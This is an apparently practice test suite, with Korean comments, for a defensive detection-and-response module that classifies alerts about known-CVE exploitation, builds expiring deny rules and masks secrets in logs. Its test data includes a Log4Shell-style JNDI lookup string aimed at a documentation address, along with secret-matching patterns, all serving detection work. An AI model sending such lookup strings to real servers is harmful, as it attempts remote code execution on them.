// 보너스 xdr-03: 알려진 취약점 악용 모듈 시험(가상 경보 연습이며 심판 판정이 아닙니다)
import assert from 'node:assert/strict';
import test from 'node:test';
import { cp, mkdtemp, mkdir, readFile, rm, writeFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { ALERT_AT, BLOCK_AT, PATTERNS, decide } from '../xdr/known-cve/decide.mjs';
import { pickRow, readAlerts, redact } from '../xdr/known-cve/read-alerts.mjs';
import { buildDenyRules, isDenied, isProtectedAddress, respond } from '../xdr/known-cve/respond.mjs';
import { runXdr } from '../scripts/xdr-run.mjs';

const root = new URL('..', import.meta.url).pathname;
const fixturePath = join(root, 'xdr', 'fixtures', 'known-cve.json');
const fixture = JSON.parse(await readFile(fixturePath, 'utf8'));
const patternsFile = JSON.parse(await readFile(join(root, 'xdr', 'known-cve', 'patterns.json'), 'utf8'));
const num = (n) => Number(n.slice(3));
const expectedAction = (alert) => (num(alert.id) <= 8 ? 'block' : num(alert.id) <= 16 ? 'alert' : 'record');

test('every pattern has a name, a technique, conditions and a one-line evidence, and nothing is listed without evidence', () => {
  assert.ok(patternsFile.patterns.length >= 2);
  const names = new Set();
  for (const p of patternsFile.patterns) {
    assert.match(p.name, /^[a-z][a-z0-9_]+$/u);
    assert.match(p.technique, /^T1190(\.00[1-4])?$/u);
    assert.ok(p.when && Object.keys(p.when).length > 0);
    assert.ok(typeof p.evidence === 'string' && p.evidence.length > 10 && !p.evidence.includes('\n'));
    assert.ok(p.evidence.includes('T1190'), `${p.name}: 근거에 ATT&CK 번호가 있어야 합니다`);
    names.add(p.name);
  }
  assert.equal(names.size, patternsFile.patterns.length);
});

test('decide.mjs repeats the patterns file exactly, imports nothing and touches no files, network or process', async () => {
  assert.deepEqual(PATTERNS, patternsFile.patterns);
  const source = await readFile(join(root, 'xdr', 'known-cve', 'decide.mjs'), 'utf8');
  const code = source.replace(/\/\/.*$/gmu, '');
  assert.equal(/\bimport\b|\brequire\s*\(|\bprocess\b|\bfetch\b|\bXMLHttpRequest\b|\bfs\b|readFile|writeFile|Date\.now|Math\.random|globalThis/u.test(code), false);
});

test('decide splits the practice alerts into block, alert and record, and never blocks a normal event', () => {
  const counts = { block: 0, alert: 0, record: 0 };
  for (const alert of fixture.alerts) {
    const out = decide(alert);
    assert.equal(out.action, expectedAction(alert), `${alert.id}: ${JSON.stringify(out)}`);
    assert.ok(out.confidence >= 0 && out.confidence <= 1);
    assert.equal(typeof out.reason, 'string');
    assert.equal(out.reason.includes('\n'), false);
    assert.deepEqual(Object.keys(out).sort(), ['action', 'confidence', 'reason']);
    counts[out.action] += 1;
    if (num(alert.id) >= 17) assert.notEqual(out.action, 'block', `정상 이벤트 ${alert.id}를 막았습니다`);
  }
  assert.deepEqual(counts, { block: 8, alert: 8, record: 8 });
  // 임계값과 행동이 맞물립니다.
  for (const alert of fixture.alerts) {
    const { action, confidence } = decide(alert);
    assert.equal(action, confidence >= BLOCK_AT ? 'block' : confidence >= ALERT_AT ? 'alert' : 'record');
  }
});

test('decide handles boundaries and odd input without throwing', () => {
  const L = '$' + '{jndi:ldap://203.0.113.9/x}'; // 문서용 주소의 가상 구문
  const mk = (level, data, mitre = ['T1190'], description = '시험 경보입니다.') => ({ id: 'x', rule: { level, description, mitre }, data: { srcip: '203.0.113.9', ...data } });
  assert.equal(decide(mk(12, { url: `/search?q=${L}` })).action, 'block');
  assert.equal(decide(mk(12, { useragent: L })).action, 'block');
  assert.equal(decide(mk(12, { url: '/search?q=$' + '{jndi:' })).action, 'alert'); // 조각만 있으면 막지 않습니다
  assert.equal(decide(mk(6, { url: '/notes?q=jndi-class-note' })).action, 'alert');
  assert.equal(decide(mk(12, { srcip: L })).action, 'alert'); // 주소 칸은 요청 값이 아닙니다
  assert.equal(decide(mk(8, { url: `/x?q=${L}` }, [])).action, 'alert'); // 표시가 없으면 막지 않고 알립니다
  assert.equal(decide(mk(3, { url: `/x?q=${L}` }, [])).action, 'record'); // 정상으로 보이는 사건
  assert.equal(decide(mk(12, { url: '/search?q=CVE-2021-44228' }, ['T1190'], 'CVE-2021-44228 형태 요청입니다.')).action, 'alert'); // 설명 글의 CVE 글자만으로는 막지 않습니다
  for (const odd of [null, undefined, 5, 'x', [], {}, { rule: null }, { rule: { level: 'high' }, data: 'abc' }, { data: { url: L } }]) {
    const out = decide(odd);
    assert.ok(['block', 'alert', 'record'].includes(out.action));
    assert.ok(out.confidence >= 0 && out.confidence <= 1);
  }
  const out = decide(mk(12, { url: `/search?q=${L}` }));
  assert.equal(/ldap:|\$\{/u.test(out.reason), false); // 이유 글에 구문 원문을 옮기지 않습니다
});

test('read-alerts returns as many rows as there are alerts, keeps only the five fields, masks secret-looking values and leaves the file alone', async () => {
  const before = createHash('sha256').update(await readFile(fixturePath)).digest('hex');
  const { total, rows } = await readAlerts(fixturePath);
  assert.equal(total, fixture.alerts.length);
  assert.equal(rows.length, total);
  for (const row of rows) assert.deepEqual(Object.keys(row), ['at', 'srcip', 'srcuser', 'level', 'description']);
  const dirty = pickRow({ timestamp: 't', data: { srcip: '203.0.113.1', srcuser: 'password=hunter2' }, rule: { level: 5, description: 'token: abc123 Bearer abcdefghijklmnop sb_secret_ABCDEF eyJhbGciOiJI.eyJzdWIiOiIx.sig 0123456789abcdef0123456789abcdef' } });
  const text = JSON.stringify(dirty);
  for (const secret of ['hunter2', 'abc123', 'abcdefghijklmnop', 'sb_secret_ABCDEF', 'eyJhbGciOiJI', '0123456789abcdef0123456789abcdef']) assert.equal(text.includes(secret), false, secret);
  assert.equal(redact(42), '');
  assert.equal(createHash('sha256').update(await readFile(fixturePath)).digest('hex'), before);
  const source = await readFile(join(root, 'xdr', 'known-cve', 'decide.mjs'), 'utf8');
  assert.equal(source.includes('read-alerts'), false);
});

test('respond adds deny rules only for block candidates, with expiry and alert id, and normal traffic passes', async () => {
  const decisions = fixture.alerts.map((alert) => ({ alertId: alert.id, ...decide(alert) }));
  const now = new Date('2026-10-15T00:00:00Z');
  const { rules, skipped } = buildDenyRules({ alerts: fixture.alerts, decisions, now });
  const blockAddresses = new Set(fixture.alerts.filter((a) => expectedAction(a) === 'block').map((a) => a.data.srcip));
  assert.deepEqual(new Set(rules.map((r) => r.address)), blockAddresses);
  assert.equal(skipped.length, 0);
  for (const rule of rules) {
    assert.equal(rule.effect, 'deny');
    assert.match(rule.alertId, /^kc-\d+$/u);
    assert.ok(Date.parse(rule.expiresAt) > Date.parse(rule.createdAt));
  }
  // 정상(record)·애매(alert) 경보의 주소는 규칙에 없고 통과합니다.
  for (const alert of fixture.alerts.filter((a) => expectedAction(a) !== 'block')) {
    assert.equal(isDenied(alert.data.srcip, rules, now), null, alert.id);
  }
  for (const address of blockAddresses) assert.ok(isDenied(address, rules, now), address);
  // 만료되면 더는 막지 않습니다.
  assert.equal(isDenied('203.0.113.10', rules, new Date(now.getTime() + 2 * 60 * 60 * 1000)), null);
});

test('respond never blocks a protected address or an address that also shows normal use', () => {
  assert.equal(isProtectedAddress('127.0.0.1'), true);
  assert.equal(isProtectedAddress('192.168.0.5'), true);
  assert.equal(isProtectedAddress('10.1.2.3'), true);
  assert.equal(isProtectedAddress('::1'), true);
  assert.equal(isProtectedAddress('not an ip'), true);
  assert.equal(isProtectedAddress('203.0.113.10'), false);
  const alerts = [
    { id: 'a', data: { srcip: '192.168.0.9' } }, { id: 'b', data: { srcip: '203.0.113.77' } }, { id: 'c', data: { srcip: '203.0.113.77' } },
    { id: 'd', data: { srcip: '' } }, { id: 'e', data: { srcip: '203.0.113.88' } },
  ];
  const decisions = [
    { alertId: 'a', action: 'block', confidence: 0.9, reason: 'p' }, { alertId: 'b', action: 'block', confidence: 0.9, reason: 'p' },
    { alertId: 'c', action: 'record', confidence: 0, reason: 'n' }, { alertId: 'd', action: 'block', confidence: 0.9, reason: 'p' },
    { alertId: 'e', action: 'alert', confidence: 0.6, reason: 'p' },
  ];
  const { rules, skipped } = buildDenyRules({ alerts, decisions });
  assert.deepEqual(rules, []);
  assert.deepEqual(skipped.map((s) => s.reason).sort(), ['invalid_address', 'protected_address', 'shared_with_normal_use']);
});

test('respond writes the rule file and one log line per alert or block, and leaves decider.mjs and the fixture alone', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'xdr-kc-'));
  try {
    await mkdir(join(dir, 'xdr', 'fixtures'), { recursive: true });
    await cp(fixturePath, join(dir, 'xdr', 'fixtures', 'known-cve.json'));
    const result = await respond({ root: dir, now: new Date('2026-10-15T00:00:00Z') });
    assert.equal(result.logged, 16);
    const log = (await readFile(join(dir, 'xdr', 'alerts.log'), 'utf8')).trim().split('\n');
    assert.equal(log.length, 16);
    assert.equal(log.filter((l) => l.includes(' block ')).length, 8);
    assert.equal(log.filter((l) => l.includes(' alert ')).length, 8);
    assert.equal(/password=|token[:=]|Bearer |sb_secret_|eyJ[A-Za-z0-9_-]{10,}/u.test(log.join("\n")), false);
    const file = JSON.parse(await readFile(join(dir, 'xdr', 'deny-rules.json'), 'utf8'));
    assert.equal(file.schema, 'aleph.deny-rules.v1');
    assert.equal(file.rules.length, 7);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
  const decider = await readFile(join(root, 'src', 'decider.mjs'), 'utf8');
  assert.equal(/xdr|brute|deny-rules/u.test(decider), false, '판정기 코드는 이번 보너스에서 바뀌지 않습니다.');
});

test('the provided runner gets the same result: counts, no normal event blocked, bad shapes recorded', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'xdr-run-'));
  try {
    await mkdir(join(dir, 'xdr', 'fixtures'), { recursive: true });
    await mkdir(join(dir, 'xdr', 'known-cve'), { recursive: true });
    await cp(fixturePath, join(dir, 'xdr', 'fixtures', 'known-cve.json'));
    await cp(join(root, 'xdr', 'known-cve', 'decide.mjs'), join(dir, 'xdr', 'known-cve', 'decide.mjs'));
    const errors = [];
    const result = await runXdr({ root: dir, moduleKey: 'known-cve', writeError: (line) => errors.push(line) });
    assert.deepEqual(result.counts, { block: 8, alert: 8, record: 8 });
    assert.deepEqual(errors, []);
    for (const d of result.decisions.filter((x) => num(x.alertId) >= 17)) assert.notEqual(d.action, 'block');
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
